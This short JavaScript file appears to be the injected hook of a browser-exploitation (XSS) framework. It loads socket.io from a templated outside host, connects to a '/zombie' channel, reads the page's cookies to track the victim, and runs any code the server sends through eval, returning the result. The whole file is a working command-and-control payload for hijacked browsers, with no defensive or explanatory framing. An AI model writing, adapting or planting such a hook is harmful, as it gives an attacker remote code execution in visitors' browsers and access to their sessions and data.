$.getScript('//{~socketiourl~}/dist/js/socket.io.js',initK);

function initK(){
    var data;
    var socket = io.connect('//{~socketiourl~}/zombie');
    var cookie = document.cookie;
    data = {
        'projectID': '{~projectid~}'
    };
    if(cookie.indexOf('__koalaP_') >= 0 ){
        var pcid = cookie.match(/__koalaP_=(.*?)(;|$)/)[1];
        data['pcid'] = pcid;
        socket.emit('updateZombieStatus',data);
    }else{
        socket.emit('init', data);
    }
    socket.on('exec', function (data) {
        console.log(data);
        var callbackData = eval(data);
        socket.emit('callbackExec', callbackData);
    });
}
